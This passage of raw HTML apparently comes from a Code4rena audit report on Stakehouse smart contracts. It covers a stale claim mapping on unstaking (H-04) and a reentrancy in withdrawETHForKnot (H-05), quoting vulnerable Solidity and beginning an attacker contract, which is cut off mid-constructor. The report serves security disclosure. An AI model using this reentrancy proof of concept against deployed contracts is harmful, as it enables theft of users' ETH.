href=\"#h-04-unstaking-does-not-update-the-mapping-sethuserclaimforknot\" aria-label=\"h 04 unstaking does not update the mapping sethuserclaimforknot permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90\">[H-04] Unstaking does not update the mapping <code>sETHUserClaimForKnot</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90\">HE1M</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/180\">9svR6w</a></em></p>\n<p>If a user stakes some sETH, and after some time decides to unstake some amount of sETH, later s/he will not be qualified or be less qualified to claim ETH on the remaining staked sETH.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Suppose Alice stakes 5 sETH by calling <code>stake(...)</code>.<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L203\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L203</a><br>\nSo, we will have:</p>\n<ul>\n<li><code>sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION</code></li>\n<li><code>sETHStakedBalanceForKnot[BLS][Alice] = 5 * 10^18</code></li>\n<li><code>sETHTotalStakeForKnot[BLS] += 5 * 10^18</code></li>\n</ul>\n<p>Later, Alice decides to unstake 3 sETH by calling <code>unstake(...)</code>.<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245</a></p>\n<p>So, all ETH owed to Alice will be paid:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L257\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L257</a></p>\n<p>Then, we will have:</p>\n<ul>\n<li><code>sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION</code></li>\n<li><code>sETHStakedBalanceForKnot[BLS][Alice] = 2 * 10^18</code></li>\n<li><code>sETHTotalStakeForKnot[BLS] -= 3 * 10^18</code></li>\n</ul>\n<p>It is clear that the mapping <code>sETHStakedBalanceForKnot</code> is decreased as expected, but the mapping <code>sETHUserClaimForKnot</code> is not changed. In other words, the mapping <code>sETHUserClaimForKnot</code> is still holding the claimed amount based on the time 5 sETH were staked.</p>\n<p>If, after some time, the ETH is accumulated per free floating share for the BLS public key that Alice was staking for, Alice will be qualified to some more ETH to claim (because she has still 2 sETH staked).</p>\n<p>If Alice unstakes by calling <code>unstake(...)</code> or claim ETH by calling <code>claimAsStaker(...)</code>, in both calls, the function <code>calculateUnclaimedFreeFloatingETHShare</code> will be called to calculate the amount of unclaimed ETH:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L652\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L652</a></p>\n<p>In this function, we will have:</p>\n<ul>\n<li><code>stakedBal = sETHStakedBalanceForKnot[BLS][Alice]</code> = 2 * 10^18</li>\n<li><code>userShare = (newAccumulatedETHPerShare * stakedBal) / PRECISION</code></li>\n</ul>\n<p>The return value which is unclaimed ETH will be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">userShare - sETHUserClaimForKnot[BLS][Alice] = </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">(newAccumulatedETHPerShare * 2 * 10^18) / PRECISION - (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION</span></span></code></pre>\n<p>This return value is not correct (it is highly possible to be smaller than 0, and as a result Alice can not claim anything), because the claimed ETH is still based on the time when 5 sETH were staked, not on the time when 2 sETH were remaining/staked.</p>\n<p>The vulnerability is that during unstaking, the mapping <code>sETHUserClaimForKnot</code> is not updated to the correct value. In other words, this mapping is updated in <code>_claimAsStaker</code>, but it is updated based on 5 sETH staked, later when 3 sETH are unstaked, this mapping should be again updated based on the remaing sETH (which is 2 sETH).</p>\n<p>As a result, Alice can not claim ETH or she will qualify for less amount.</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The following line should be added on line 274:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">sETHUserClaimForKnot[_blsPubKey][msg.sender] =</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                (accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L274\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L274</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-05-reentrancy-in-liquidstakingmanagersolwithdrawethforknow-leads-to-loss-of-fund-from-smart-wallet\" style=\"position:relative;\"><a href=\"#h-05-reentrancy-in-liquidstakingmanagersolwithdrawethforknow-leads-to-loss-of-fund-from-smart-wallet\" aria-label=\"h 05 reentrancy in liquidstakingmanagersolwithdrawethforknow leads to loss of fund from smart wallet permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110\">[H-05] Reentrancy in <code>LiquidStakingManager.sol#withdrawETHForKnow</code> leads to loss of fund from smart wallet</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/402\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/330\">btk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/288\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/222\">bitbopper</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/181\">yixxas</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347</a><br></p>\n<p>The code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev A banned node runner cannot withdraw ETH for the KNOT. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawETHForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">isBLSPublicKeyBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;BLS public key has already withdrawn or not a part of LSD network&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">smartWalletOfKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWalletOfNodeRunner</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Not the node runner for the smart wallet &quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">isNodeRunnerBanned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunnerOfSmartWallet</span><span class=\"mtk1\">[</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">]) == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Node runner is banned from LSD network&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Insufficient balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">getAccountManager</span><span class=\"mtk1\">().</span><span class=\"mtk11\">blsPublicKeyToLifecycleStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">IDataStructures</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LifecycleStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INITIALS_REGISTERED</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Initials not registered&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// refund 4 ether from smart wallet to node runner&#39;s EOA</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IOwnableSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">rawExecute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update the mapping</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bannedBLSPublicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ETHWithdrawnFromSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Note the section:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// refund 4 ether from smart wallet to node runner&#39;s EOA</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">IOwnableSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">).</span><span class=\"mtk11\">rawExecute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// update the mapping</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bannedBLSPublicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKeyOfKnot</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">associatedSmartWallet</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>If the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.</p>\n<p>As shown in our running POC.</p>\n<p>We need to add the import first:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">MockAccountManager</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../contracts/testing/stakehouse/MockAccountManager.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>We can add the smart contract below:</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IManager</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">registerBLSPublicKeys</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsSignatures</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_eoaRepresentative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawETHForKnot</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeyOfKnot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NonEOARepresentative</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">state</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">) </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;publicKeys1&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;publicKeys2&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signature</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">signature</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;signature1&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">signature</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;signature2&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">).</span><span class=\"mtk12\">registerBLSPublicKeys</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">publicKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">signature</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span 